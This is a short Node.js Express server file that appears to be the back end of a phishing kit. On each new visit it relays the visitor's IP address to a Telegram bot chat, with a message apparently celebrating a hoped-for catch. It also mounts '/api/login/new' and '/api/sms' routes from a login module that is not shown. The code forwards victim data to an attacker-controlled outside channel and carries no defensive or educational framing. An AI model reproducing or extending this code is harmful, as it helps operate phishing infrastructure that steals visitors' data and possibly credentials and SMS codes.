require('dotenv').config()
const express = require('express')
const app = express()
const axios =require('axios')
const bodyParser = require('body-parser')
const cors = require('cors');
const port = 5000
const { TOKEN , ChatID } = process.env
const Telegram_api=`https://api.telegram.org/bot${TOKEN}`
app.use(cors({
    origin: '*'
}))
app.use(bodyParser.json())
app.get('/', (req, res) => {
    res.send('Hello World!')
})

app.post('/api/new', (req, res) => {
    const ress="#New visiteur from IP : "+req.ip+" \n" +
        "Nchallah rzlt ♥♥♥ \n"
    const rs = axios.post(`${Telegram_api}/sendMessage`, {
        chat_id: ChatID,
        text: ress
    })
    res.send(rs)
})

app.use('/api/login/new',require('./routres/login'))
app.use('/api/sms',require('./routres/login'))
app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
})

